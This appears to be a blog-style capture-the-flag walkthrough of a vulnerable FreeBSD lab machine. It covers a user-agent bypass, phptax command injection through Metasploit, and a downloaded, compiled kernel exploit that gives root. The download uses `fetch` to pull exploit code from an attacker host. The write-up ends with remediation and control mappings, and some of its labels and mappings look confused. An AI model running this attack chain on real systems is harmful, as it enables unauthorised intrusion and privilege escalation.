# Kioptrix: Level 1.3 / Level 13-4 — FreeBSD, phptax, and a Kernel That's Seen Better Days

Wild one here dude. Kioptrix Level 13-4 (sometimes mislabeled as "Level 1.3 #4") is actually a completely different beast from its namesake: it runs FreeBSD 9.0 and hosts a vulnerable PHP tax application (phptax) behind a user-agent-gated HTTP service. No SQL injection this time, no restricted shell escape. Instead you get unauthenticated command injection via phptax and a public kernel exploit for FreeBSD 9.0 that's been in the wild for years. Classic old-school boot2root progression, and totally slept on compared to the Linux Kioptrix entries.

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | Kioptrix: Level 1.3 / Level 13-4 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/kioptrix-level-13-4,25/ |
| **Techniques** | Nmap service enumeration, user-agent bypass, phptax directory discovery, Metasploit phptax_exec RCE, FreeBSD fetch for file transfer, kernel exploit compilation, privilege escalation via EDB-28718 |
| **CVEs** | CVE-2012-2208 (phptax Remote Code Execution), EDB-28718 (FreeBSD 9.0 Intel SYSRET Kernel Privilege Escalation), CWE-16 (Configuration: user-agent access control) |
| **APT Groups** | APT41: exploits misconfigured and unpatched web applications as initial access vectors in multi-sector targeting campaigns; Lazarus Group: documented exploitation of end-of-life OS platforms including FreeBSD variants in attacks against financial institutions |

---

## Attack Summary

```
netdiscover / nmap
  → port 80 (HTTP, default page)
  → port 8080 (HTTP, 403 Forbidden)
  → user-agent spoofing: MSIE 6.0 → bypass 403 on 8080
  → phptax/ directory discovered
  → Metasploit: exploit/multi/http/phptax_exec (CVE-2012-2208)
  → command shell → low-privilege user (www or nobody)
  → uname -a → FreeBSD 9.0-RELEASE
  → searchsploit FreeBSD 9.0 → EDB-28718
  → serve exploit via python3 -m http.server
  → target: fetch http://attacker/28718.c
  → gcc -o kernel 28718.c && chmod 777 kernel && ./kernel
  → uid=0(root)
  → cat /root/congrats.txt
```

---

## Methodology

1. Host discovery and full port scan
2. Web enumeration on port 80 and port 8080
3. User-agent bypass to access port 8080 content
4. phptax directory discovery and RCE exploitation
5. Initial shell as low-privilege user
6. OS fingerprinting for kernel version
7. Exploit-DB search for FreeBSD 9.0 kernel privilege escalation
8. File transfer via FreeBSD fetch utility
9. Compile and execute kernel exploit for root
10. Flag capture

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover
# Target: 192.168.1.159

nmap -A 192.168.1.159
```

```
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.2.x
8080/tcp open  http     Apache httpd 2.2.x
```

Two HTTP services. Port 80 returns a default placeholder page. Port 8080 returns 403 Forbidden.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration and User-Agent Bypass

Port 80 shows only a placeholder. Inspect source: nothing useful.

Port 8080 returns 403 for all standard browsers. The server enforces a user-agent check. Bypass it by spoofing an old Internet Explorer user-agent:

```bash
curl -A "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" http://192.168.1.159:8080/
```

The response exposes a `phptax/` directory, which is a PHP tax filing application with a publicly known remote code execution vulnerability.

**Alternative approaches:**
```bash
# Use User Agent Switcher browser extension
# Or set custom user-agent in Burp Suite proxy
# Or use curl --user-agent flag as shown above
```

**Real-world note:** User-agent filtering is a weak access control mechanism used in early web applications to serve different content to different browsers. It is trivially bypassed because user-agent is a client-controlled HTTP header. In 2024, this same concept manifests as IP-based access controls that are bypassed via X-Forwarded-For header injection. Any access control mechanism based on client-supplied headers is inherently unreliable.

**MITRE ATT&CK:** T1592 — Gather Victim Host Information; T1562.001 — Impair Defenses: Disable or Modify Tools

---

## Step 3 — phptax RCE (CVE-2012-2208)

phptax is a vulnerable PHP application with unauthenticated remote code execution:

```bash
msfconsole -q
msf> search phptax
msf> use exploit/multi/http/phptax_exec
msf> set RHOSTS 192.168.1.159
msf> set RPORT 8080
msf> exploit
```

Result: command shell session as a low-privilege user (`www` or `nobody`).

Verify access:

```bash
id
# uid=80(www) gid=80(www)
whoami
# www
uname -a
# FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0-RELEASE #0 ...
```

**How CVE-2012-2208 works:** phptax passes user-supplied input to PHP's `passthru()` function without sanitization. The `drawimage.php` script accepts a `pf` parameter that is directly executed as a shell command. Any unauthenticated user can inject arbitrary OS commands.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 4 — OS Fingerprinting

Confirm the OS version for exploit selection:

```bash
uname -a
# FreeBSD kioptrix2014 9.0-RELEASE #0: Thu Aug 18 02:00:22 UTC 2011
```

FreeBSD 9.0-RELEASE reached end-of-life in February 2013. Multiple public privilege escalation exploits exist for this version.

**MITRE ATT&CK:** T1082 — System Information Discovery

---

## Step 5 — Exploit-DB Search for Kernel Privilege Escalation

On the attacker machine:

```bash
searchsploit FreeBSD 9.0
```

```
FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation | exploits/freebsd/local/28718.c
```

Copy the exploit:

```bash
searchsploit -m 28718
```

**How EDB-28718 works:** The Intel SYSRET instruction has a known behavior when executed with a non-canonical address. On FreeBSD 9.0, this can be triggered by a local user to cause a general protection fault that the kernel mishandles, resulting in privilege escalation to ring 0 (kernel mode), then uid=0.

**MITRE ATT&CK:** T1068 — Exploitation for Privilege Escalation

---

## Step 6 — File Transfer via FreeBSD fetch

Start an HTTP server on the attacker machine to serve the exploit source:

```bash
python3 -m http.server 80
# Or: python -m SimpleHTTPServer 80
```

On the target, `wget` is not available on FreeBSD by default. Use the native `fetch` utility:

```bash
fetch http://192.168.1.108/28718.c
ls -la 28718.c
```

**Alternative if fetch fails:**
```bash
# Use curl if available on the target:
curl -O http://192.168.1.108/28718.c

# Or use ftp in passive mode:
ftp -o 28718.c http://192.168.1.108/28718.c
```

**Real-world note:** Knowing the native download utilities for different operating systems is critical for file transfer during post-exploitation. FreeBSD: `fetch`. Alpine Linux: `wget` may not exist, use `curl`. Windows: `certutil`, `bitsadmin`, PowerShell Invoke-WebRequest. This knowledge gap trips up many pentesters who assume `wget` is universal.

**MITRE ATT&CK:** T1105 — Ingress Tool Transfer

---

## Step 7 — Compile and Execute Kernel Exploit

```bash
gcc -o kernel 28718.c
chmod 777 kernel
./kernel
```

Verify root:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
whoami
# root
```

Read the flag:

```bash
cd /root
ls
cat congrats.txt
```

(☞ﾟヮﾟ)☞ Root. Kernel exploit nailed it.

**MITRE ATT&CK:** T1068 — Exploitation for Privilege Escalation

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| Initial shell | www/nobody | phptax CVE-2012-2208 RCE | Web application command execution |
| Kernel exploit | EDB-28718 compiled | FreeBSD 9.0 Intel SYSRET bug | Root privilege escalation |
| Root shell | uid=0(root) | Kernel exploit execution | Full system access |
| Flag | congrats.txt | /root/ | Proof of compromise |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | User-agent filtering as access control | Client-controlled headers are always bypassable; no client-side enforcement is reliable | Implement real authentication; never rely on user-agent, IP, or header-based access control |
| 2 | phptax unauthenticated RCE via passthru() | Legacy PHP applications with direct OS command execution are consistently exploited in web application pentests | Remove legacy applications; validate all user input; use escapeshellarg() for any command execution |
| 3 | FreeBSD 9.0 end-of-life since 2013 | Running EOL operating systems means publicly known kernel exploits have no patch available | Always run supported OS versions; implement compensating controls if EOL cannot be avoided |
| 4 | fetch replaces wget on FreeBSD | Pentesters who only know wget fail file transfers on non-Linux targets | Learn native download utilities for each OS: fetch (FreeBSD), curl (most Unix), certutil/bitsadmin/IWR (Windows) |
| 5 | Kernel exploit compiled on target | Some targets have GCC available for attacker use | Minimize installed development tools on production servers; use stripped base images |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | Gather Victim Host Information | T1592 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Defense Evasion | Evasion | Impair Defenses: User-Agent Bypass | T1562.001 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Discovery | Discovery | System Information Discovery | T1082 |
| Lateral Movement | Transfer | Ingress Tool Transfer | T1105 |
| Privilege Escalation | Privilege Escalation | Exploitation for Privilege Escalation | T1068 |

---

## Remediation and Containment

### Technical Fixes

1. **Replace phptax**: Remove or replace the application; validate and sanitize all user input; use `escapeshellarg()` for any OS command execution
2. **Implement real access control**: Replace user-agent filtering with authentication; never trust client-supplied headers for access decisions
3. **Upgrade FreeBSD**: Upgrade to a supported FreeBSD release; apply all security patches; subscribe to FreeBSD security advisories
4. **Remove GCC from web servers**: Development tools on production servers allow in-place exploit compilation; use minimal base images
5. **Apply least privilege**: Web application processes should run as a dedicated low-privilege user, not `www` or `nobody` with broad filesystem access

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all running OS versions; flag EOL systems |
| Protect | Access Control | Implement authentication for restricted services; remove user-agent access control |
| Protect | Platform Security | Upgrade to supported OS; apply security patches |
| Detect | Anomalies | Alert on phptax-style command injection patterns in web logs |
| Respond | Response Planning | Isolate compromised host; remove phptax; patch OS |
| Recover | Recovery Planning | Rebuild from supported OS image; audit all web applications |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| SI-2 | Flaw Remediation | Upgrade FreeBSD to supported release; patch phptax |
| AC-17 | Remote Access | Implement real authentication for HTTP services; remove header-based access control |
| CM-7 | Least Functionality | Remove GCC and development tools from web server |
| SI-3 | Malware Protection | Deploy HIDS to detect kernel exploit execution and unusual privilege changes |

### CISA KEV

CVE-2012-2208 (phptax RCE) maps to the category of unpatched web application vulnerabilities that CISA consistently warns against via BOD 22-01. FreeBSD 9.0 EOL aligns with CISA guidance on unsupported software. Organizations should apply CISA Alert AA22-074A guidance on web application attack surface reduction.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Threat and Vulnerability Management (THREAT) | Manage Vulnerabilities | MIL3 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Asset Inventory | MIL2 |
| Situational Awareness (SITUATION) | Perform Logging | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Application Configuration Hardening (real authentication; remove user-agent filtering)
- **D3-OAM** — Operating System Administrative Management (upgrade EOL OS; remove dev tools)
- **D3-WSAA** — Web Session Activity Analysis (detect phptax injection patterns in access logs)

---

## Final Thoughts

Kioptrix Level 13-4 is a great reminder that not every CTF machine is Linux. FreeBSD targets require a slightly different mindset: fetch instead of wget, slightly different filesystem layout, and different kernel exploit chains. The user-agent bypass is a fun throwback to early web security, and the phptax vulnerability is a textbook example of why `passthru()` with unsanitized input is lethal.

The machine rewards attackers who read OS fingerprints carefully and know their way around non-Linux targets. Wild that a machine running FreeBSD 9.0 kernel from 2011 is still a relevant teaching tool in 2024.

Thanks guys!! (❍ᴥ❍ʋ)
